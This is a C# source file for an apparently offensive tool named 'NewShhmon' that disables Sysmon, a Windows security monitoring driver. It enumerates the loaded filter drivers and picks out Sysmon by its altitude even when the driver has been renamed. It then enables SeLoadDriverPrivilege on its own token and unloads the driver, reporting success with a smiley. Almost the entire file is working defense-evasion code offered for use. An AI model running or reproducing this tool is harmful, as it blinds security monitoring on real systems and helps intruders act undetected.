using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Runtime.InteropServices;
using System.Text;

namespace NewShhmon
{
    class Program
    {
        static void Main(string[] args)
        {
            List<FilterInfo> filterInfo = GetFiltersInformation();
            foreach (var filter in filterInfo)
            {
                if (filter.Altitude.Equals(385201))
                {
                    if (filter.Name.Equals("SysmonDrv"))
                    {
                        Console.WriteLine("[+] Found the Sysmon driver running with default name \"SysmonDrv\"");
                        uint status = NativeMethods.FilterUnload(filter.Name);
                        Console.WriteLine(status);
                    }
                    else
                    {
                        Console.WriteLine("[+] Found the Sysmon driver running with alternate name \"{0}\"", filter.Name);
                        Console.WriteLine("[+] Trying to kill the driver...");
                        IntPtr currentProcessToken = new IntPtr();
                        NativeMethods.OpenProcessToken(Process.GetCurrentProcess().Handle, NativeMethods.TOKEN_ALL_ACCESS, out currentProcessToken);
                        SetTokenPrivilege(ref currentProcessToken);
                        uint status = NativeMethods.FilterUnload(filter.Name);
                        if (!status.Equals(0))
                        {
                            Console.WriteLine("[-] Driver unload failed");
                        }
                        else
                        {
                            Console.WriteLine("[+] {0} was unloaded :)", filter.Name);
                        }
                    }
                }
                else
                { }
            }
            Console.ReadKey();
        }

        public static void SetTokenPrivilege(ref IntPtr hToken)
        {
            Console.WriteLine("[*] Adding SeLoadDriverPrivilege to token");
            LUID luid = new LUID();
            if (!NativeMethods.LookupPrivilegeValue(null, "SeLoadDriverPrivilege", ref luid))
            {
                Console.WriteLine("[-] LookupPrivilegeValue failed!");
                return;
            }
            Console.WriteLine("[+] Received LUID");

            LUID_AND_ATTRIBUTES luidAndAttributes = new LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = 0x2; //SE_PRIVILEGE_ENABLED

            TOKEN_PRIVILEGES newState = new TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            TOKEN_PRIVILEGES previousState = new TOKEN_PRIVILEGES();
            uint retLen = 0;
            if (!NativeMethods.AdjustTokenPrivileges(hToken, false, ref newState, (uint)Marshal.SizeOf(newState), ref previousState, out retLen))
            {
                Console.WriteLine("[-] AdjustTokenPrivileges failed!");
                return;
            }

            Console.WriteLine("[+] SeLoadDriverPrivilege added!");
            return;
        }

        public struct FilterInfo
        {
            public string Name { get; internal set; }
            public int Altitude { get; internal set; }
            public int? Instances { get; internal set; }
            public int? FrameId { get; internal set; }
        }

        public static List<FilterInfo> GetFiltersInformation()
        {
            List<FilterInfo> result = new List<FilterInfo>();
            {
                using (ResizableBuffer buffer = new ResizableBuffer(1024))
                {
                    IntPtr filterFindHandle = IntPtr.Zero;
                    uint hr = 0;

                    try
                    {
                        uint bytesReturned;

                        hr = NativeMethods.FilterFindFirst(NativeMethods.FilterInformationClass.FilterAggregateStandardInformation, buffer.DangerousGetPointer(), (uint)buffer.ByteLength, out bytesReturned, out filterFindHandle);

                        if (hr == NativeMethods.ErrorInsufficientBuffer)
                        {
                            buffer.Resize(unchecked((int)bytesReturned));
                            hr = NativeMethods.FilterFindFirst(NativeMethods.FilterInformationClass.FilterAggregateStandardInformation, buffer.DangerousGetPointer(), (uint)buffer.ByteLength, out bytesReturned, out filterFindHandle);
                        }

                        if (hr != NativeMethods.Ok)
                        {
                            // There are no filters available.
                            if (hr == NativeMethods.ErrorNoMoreItems)
                            {
                                return result;
                            }

                            throw Marshal.GetExceptionForHR(unchecked((int)hr));
                        }

                        result.AddRange(MarshalFilterInfo(buffer.DangerousGetPointer()));

                        while (true)
                        {
                            hr = NativeMethods.FilterFindNext(filterFindHandle, NativeMethods.FilterInformationClass.FilterAggregateStandardInformation, buffer.DangerousGetPointer(), (uint)buffer.ByteLength, out bytesReturned);
                            if (hr == NativeMethods.ErrorInsufficientBuffer)
                            {
                                buffer.Resize(unchecked((int)bytesReturned));
                                hr = NativeMethods.FilterFindNext(filterFindHandle, NativeMethods.FilterInformationClass.FilterAggregateStandardInformation, buffer.DangerousGetPointer(), (uint)buffer.ByteLength, out bytesReturned);
                            }

                            if (hr != NativeMethods.Ok)
                            {
                                if (hr == NativeMethods.ErrorNoMoreItems)
                                {
                                    break;
                                }

                                throw Marshal.GetExceptionForHR(unchecked((int)hr));
                            }

                            result.AddRange(MarshalFilterInfo(buffer.DangerousGetPointer()));
                        }
                    }
                    catch (Exception e)
                    {
                        string message = string.Format(CultureInfo.InvariantCulture, "Unable to get the filter driver information: 0x{0:X8}", hr);

                        throw new InvalidOperationException(message, e);
                    }
                    finally
                    {
                        if (filterFindHandle != IntPtr.Zero)
                        {
                            NativeMethods.FilterFindClose(filterFindHandle);
                        }
                    }
                }
            }

            return result;
        }

        private static IEnumerable<FilterInfo> MarshalFilterInfo(IntPtr ptr)
        {
            if (ptr == IntPtr.Zero)
            {
                throw new ArgumentNullException(nameof(ptr));
            }

            List<FilterInfo> result = new List<FilterInfo>();
            IntPtr curPtr = ptr;

            while (true)
            {
                // Get the structure offset from the aggregate information and marshal it.
                FilterAggregateStandardInformation aggregateInfo = (FilterAggregateStandardInformation)Marshal.PtrToStructure(curPtr, typeof(FilterAggregateStandardInformation));
                IntPtr infoPtr = curPtr + FilterAggregateStandardInformation.GetStructureOffset();

                FilterInfo filterInfo = new FilterInfo();

                //// The following code is not very 'clear', but adding a separate method for parsing Name and Altitude fields is redundant.

                // Whether the structure contains legacy or minifilter information.
                if (aggregateInfo.Flags == FilterAggregateStandardInformation.FltflAsiIsMinifilter)
                {
                    FilterAggregateStandardMiniFilterInformation info = (FilterAggregateStandardMiniFilterInformation)Marshal.PtrToStructure(infoPtr, typeof(FilterAggregateStandardMiniFilterInformation));
                    filterInfo.FrameId = unchecked((int)info.FrameId);
                    filterInfo.Instances = unchecked((int)info.NumberOfInstances);

                    filterInfo.Name = Marshal.PtrToStringUni(curPtr + info.FilterNameBufferOffset, info.FilterNameLength / UnicodeEncoding.CharSize);
                    filterInfo.Altitude = int.Parse(Marshal.PtrToStringUni(curPtr + info.FilterAltitudeBufferOffset, info.FilterAltitudeLength / UnicodeEncoding.CharSize), NumberStyles.Integer, CultureInfo.InvariantCulture);
                }
                else if (aggregateInfo.Flags == FilterAggregateStandardInformation.FltflAsiIsLegacyfilter)
                {
                    FilterAggregateStandardLegacyFilterInformation info = (FilterAggregateStandardLegacyFilterInformation)Marshal.PtrToStructure(infoPtr, typeof(FilterAggregateStandardLegacyFilterInformation));
                    filterInfo.Name = Marshal.PtrToStringUni(curPtr + info.FilterNameBufferOffset, info.FilterNameLength / UnicodeEncoding.CharSize);
                    filterInfo.Altitude = int.Parse(Marshal.PtrToStringUni(curPtr + info.FilterAltitudeBufferOffset, info.FilterAltitudeLength / UnicodeEncoding.CharSize), NumberStyles.Integer, CultureInfo.InvariantCulture);
                }
                else
                {
                    throw new InvalidOperationException(string.Format(CultureInfo.InvariantCulture, "Invalid information type received: {0:X8}", aggregateInfo.Flags));
                }

                result.Add(filterInfo);

                // If there're several entries in the buffer, proceed to the next one.
                if (aggregateInfo.NextEntryOffset == 0)
                {
                    break;
                }

                curPtr += unchecked((int)aggregateInfo.NextEntryOffset);
            }

            return result;
        }

        public static bool CheckTokenPrivs()
        {

            return false;
        }
    }

    public class ResizableBuffer : IDisposable
    {
        #region Fields
        private readonly object syncRoot = new object();
        private readonly int maxBufferSize = Math.Max(5 * 1024 * 1024, Environment.SystemPageSize);
        private IntPtr buffer = IntPtr.Zero;
        private volatile int byteLength;
        private volatile bool isDisposed;

        #endregion // Fields

        #region Constructor
        public ResizableBuffer()
            : this(Environment.SystemPageSize)
        {
            // Do nothing.
        }
        public ResizableBuffer(int initialSize)
        {
            EnsureBufferIsOfTheRightSize(initialSize);
        }

        ~ResizableBuffer()
        {
            Dispose(false);
        }

        #endregion // Constructor

        #region Properties

        public int ByteLength
        {
            get
            {
                lock (syncRoot)
                {
                    if (isDisposed)
                    {
                        throw new ObjectDisposedException("Buffer is already disposed.");
                    }

                    return byteLength;
                }
            }
        }

        public bool Disposed
        {
            get
            {
                return isDisposed;
            }
        }

        #endregion // Properties

        #region Public methods

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        public IntPtr DangerousGetPointer()
        {
            lock (syncRoot)
            {
                if (isDisposed)
                {
                    throw new ObjectDisposedException("Buffer is already disposed.");
                }

                return buffer;
            }
        }

        public void Resize(int newSize)
        {
            lock (syncRoot)
            {
                if (isDisposed)
                {
                    throw new ObjectDisposedException("Buffer is already disposed.");
                }

                EnsureBufferIsOfTheRightSize(newSize);
            }
        }

        #endregion // Public methods

        #region Protected methods

        protected virtual void Dispose(bool disposing)
        {
            lock (syncRoot)
            {
                if (buffer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(buffer);

                    buffer = IntPtr.Zero;
                    byteLength = 0;
                }

                isDisposed = true;
            }
        }

        #endregion // Protected methods

        #region Private methods

        private void EnsureBufferIsOfTheRightSize(int newSize)
        {
            if (newSize <= 0 || newSize > maxBufferSize)
            {
                throw new ArgumentOutOfRangeException(
                    nameof(newSize),
                    string.Format(CultureInfo.InvariantCulture, "Desired size should be greater than zero and lesser than {0}", maxBufferSize));
            }

            // Skip, if the buffer is already large enough.
            if (byteLength >= newSize)
            {
                return;
            }

            try
            {
                // Is it initial allocation or we need to extend the buffer?
                buffer = buffer == IntPtr.Zero
                              ? Marshal.AllocHGlobal(newSize)
                              : Marshal.ReAllocHGlobal(buffer, new IntPtr(newSize));

                byteLength = newSize;
                NativeMethods.ZeroMemory(buffer, (uint)byteLength);
            }
            catch (OutOfMemoryException oom)
            {
                buffer = IntPtr.Zero;
                byteLength = 0;

                throw new InvalidOperationException("Unable to allocate or extend the buffer.", oom);
            }
        }
        #endregion // Private methods
    }

    internal static class NativeMethods
    {
        #region Constants
        public const uint Ok = 0;
        public const uint ErrorOperationAborted = 0x800703E3;
        public const uint ErrorIoPending = 0x800703E5;
        public const uint WaitTimeout = 0x80070102;
        public const uint ErrorAlreadyExists = 0x800700B7;
        public const uint ErrorFileNotFound = 0x80070002;
        public const uint ErrorServiceAlreadyRunning = 0x80070420;
        public const uint ErrorBadExeFormat = 0x800700C1;
        public const uint ErrorBadDriver = 0x800707D1;
        public const uint ErrorInvalidImageHash = 0x80070241;
        public const uint ErrorFltInstanceAltitudeCollision = 0x801F0011;
        public const uint ErrorFltInstanceNameCollision = 0x801F0012;
        public const uint ErrorFltFilterNotFound = 0x801F0013;
        public const uint ErrorFltInstanceNotFound = 0x801F0015;
        public const uint ErrorNotFound = 0x80070490;
        public const uint ErrorNoMoreItems = 0x80070103;
        public const uint ErrorInsufficientBuffer = 0x8007007A;

        public const uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const uint STANDARD_RIGHTS_READ = 0x00020000;
        public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const uint TOKEN_DUPLICATE = 0x0002;
        public const uint TOKEN_IMPERSONATE = 0x0004;
        public const uint TOKEN_QUERY = 0x0008;
        public const uint TOKEN_QUERY_SOURCE = 0x0010;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const uint TOKEN_ADJUST_GROUPS = 0x0040;
        public const uint TOKEN_ADJUST_DEFAULT = 0x0080;
        public const uint TOKEN_ADJUST_SESSIONID = 0x0100;
        public const uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const uint TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);

        public const uint SE_PRIVILEGE_ENABLED = 0x2;
        public const uint SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1;
        public const uint SE_PRIVILEGE_REMOVED = 0x4;
        public const uint SE_PRIVILEGE_USED_FOR_ACCESS = 0x3;

        #endregion //Constants

        #region Enums
        internal enum FilterInformationClass
        {
            FilterFullInformation = 0,
            FilterAggregateBasicInformation,
            FilterAggregateStandardInformation
        }

        #endregion // Enums

        #region fltlib.dll
        [DllImport("fltlib.dll")]
        public static extern uint FilterLoad(
            [MarshalAs(UnmanagedType.LPWStr)] string filterName);

        [DllImport("fltlib.dll")]
        public static extern uint FilterUnload(
            [MarshalAs(UnmanagedType.LPWStr)] string filterName);

        [DllImport("fltlib.dll")]
        public static extern uint FilterDetach(
            [MarshalAs(UnmanagedType.LPWStr)] string filterName,
            [MarshalAs(UnmanagedType.LPWStr)] string volumeName,
            [MarshalAs(UnmanagedType.LPWStr)] string instanceName);

        [DllImport("fltlib.dll")]
        public static extern uint FilterFindFirst(
            [MarshalAs(UnmanagedType.I4)] FilterInformationClass informationClass,
            IntPtr buffer,
            uint bufferSize,
            out uint bytesReturned,
            out IntPtr filterFind);

        [DllImport("fltlib.dll")]
        public static extern uint FilterFindNext(
            IntPtr filterFind,
            [MarshalAs(UnmanagedType.I4)] FilterInformationClass informationClass,
            IntPtr buffer,
            uint bufferSize,
            out uint bytesReturned);

        [DllImport("fltlib.dll")]
        public static extern uint FilterFindClose(
            IntPtr filterFind);

        #endregion // fltlib.dll

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern void ZeroMemory(
            IntPtr handle,
            uint length);

        [DllImport("kernel32.dll")]
        internal static extern Boolean OpenProcessToken(IntPtr hProcess, uint dwDesiredAccess, out IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean AdjustTokenPrivileges(
            IntPtr TokenHandle,
            bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState,
            uint BufferLengthInBytes,
            ref TOKEN_PRIVILEGES PreviousState,
            out uint ReturnLengthInBytes
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean LookupPrivilegeValue(
            string lpSystemName,
            string lpName,
            ref LUID luid
        );
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public uint HighPart;
    }
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal struct FilterAggregateStandardInformation
    {
        public const uint FltflAsiIsMinifilter = 0x00000001;
        public const uint FltflAsiIsLegacyfilter = 0x00000002;
        [MarshalAs(UnmanagedType.U4)]
        public uint NextEntryOffset;
        [MarshalAs(UnmanagedType.U4)]
        public uint Flags;
        [MarshalAs(UnmanagedType.U4)]
        public uint StructureOffset;
        public static int GetStructureOffset()
        {
            return Marshal.OffsetOf(typeof(FilterAggregateStandardInformation), nameof(StructureOffset)).ToInt32();
        }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal struct FilterAggregateStandardMiniFilterInformation
    {
        [MarshalAs(UnmanagedType.U4)]
        public uint Flags;
        [MarshalAs(UnmanagedType.U4)]
        public uint FrameId;
        [MarshalAs(UnmanagedType.U4)]
        public uint NumberOfInstances;
        [MarshalAs(UnmanagedType.U2)]
        public ushort FilterNameLength;
        [MarshalAs(UnmanagedType.U2)]
        public ushort FilterNameBufferOffset;
        [MarshalAs(UnmanagedType.U2)]
        public ushort FilterAltitudeLength;
        [MarshalAs(UnmanagedType.U2)]
        public ushort FilterAltitudeBufferOffset;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal struct FilterAggregateStandardLegacyFilterInformation
    {
        [MarshalAs(UnmanagedType.U4)]
        public uint Flags;
        [MarshalAs(UnmanagedType.U2)]
        public ushort FilterNameLength;
        [MarshalAs(UnmanagedType.U2)]
        public ushort FilterNameBufferOffset;
        [MarshalAs(UnmanagedType.U2)]
        public ushort FilterAltitudeLength;
        [MarshalAs(UnmanagedType.U2)]
        public ushort FilterAltitudeBufferOffset;
    }
}